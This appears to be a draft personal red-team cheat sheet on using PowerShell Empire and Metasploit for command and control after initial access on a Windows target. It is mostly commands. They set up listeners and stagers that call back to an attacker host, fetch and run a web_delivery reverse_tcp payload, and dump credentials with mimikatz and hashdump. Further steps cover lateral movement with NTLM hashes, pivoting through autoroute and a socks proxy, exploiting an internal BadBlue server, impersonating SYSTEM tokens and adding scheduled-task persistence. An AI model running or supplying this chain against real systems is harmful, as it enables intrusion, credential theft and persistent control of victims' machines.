---
title: Command and Control (C2-C&C)
draft: true
tags:
  - red-team
  - offensive
  - powershell
  - windows
---
 
# Powershell Empire & Starkiller
> [!Requirements] 
> - Initial access on a target

- Installation:
```sh
$ sudo apt-get update && apt-get install powershell-empire
```

- Initialize Server and Client:
```bash
$ sudo powershell-empire server
$ powershell-empire client
```

- Help commands:
```powershell
empire> help
*after using a module (useMODULE)*
empire> options
```

Client usage steps:
1. Setup the listener
```powershell
empire> uselistener http
empire> set Host LHOST
empire> set Port LPORT
empire> execute
empire> main (unselect module)
empire> listeners (display listeners)
```


2. Setup the stager (agent) on the target machine we have initial access on:
```powershell
empire> usestager multi/launcher
empire> set Listener LISTENER_NAME
*copy the PSH payload and paste it on the initial access target*
empire> main
empire> agents (display agents)
empire> rename OLD_NAME NEW_NAME
empire> interact AGENT_NAME
```

3. Interacting with an Agent
```powershell
empire> help (display commands)

- Simple commands:
empire> shell "COMMAND" (execute a command)
empire> history (display commands and results)

- Modules:
empire> usemodule powershell/situational_awareness/host/computerdetails
empire> set Agent AGENT_NAME
empire> execute
empire> usemodule powershell/situational_awareness/host/winenum (enumerate host and current user)

- Privileged modules (if we are a privileged user):
empire> usemodule powershell/credentials/mimikatz/lsadump
empire> set Agent AGENT_NAME
empire> execute

- Lateral Movement:
empire> usemodule powershell/lateral_movement/invoke_smbexec
empire> set Username Administrator
empire> set Hash NTLM_HASH
empire> set Command "COMMAND"
empire> execute

+ PIVOTING: METASPLOIT + POWERSHELL EMPIRE +
- Identify open ports on the internal target:
empire> usemodule powershell/situational_awareness/network/portscan
empire> set Host INTERNAL_IP
empire> set Agent AGENT_NAME
empire> execute

- Obtain a meterpreter session on the target
msf> use exploit/multi/script/web_delivery
msf> set payload windows/meterpreter/reverse_tcp
msf> set LHOST LOCAL_HOST
msf> set target 2
msf> exploit
*copy the WEB_DELIVERY_URL*

- Perform the pivoting
empire> usemodule powershell/code_execution/invoke_metasploitpayload
empire> set URL WEB_DELIVERY_URL
empire> execute
*wait for the session to open on msf*

msf> use post/multi/manage/autoroute
msf> set SESSION SESSION_ID
msf> run

msf> use auxiliary/server/socks_proxy
msf> set SRVHOST LOCAL_IP
msf> run
*we can now access the internal server*

- Exploit the internal target:
msf> use exploit/windows/http/badblue_passthru
msf> set LPORT LOCAL_PORT
msf> set RHOSTS INTERNAL_IP
msf> set payload windows/meterpreter/bind_tcp
msf> exploit

- Escalate privileges:
meterpreter> load incognito 
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"
meterpreter> pgrep lsass
meterpreter> migrate LSASS_PID
meterpreter> hashdump
*perform the lateral movement*

- Persistence
empire> usemodule powershell/persistence/elevated/schtasks
```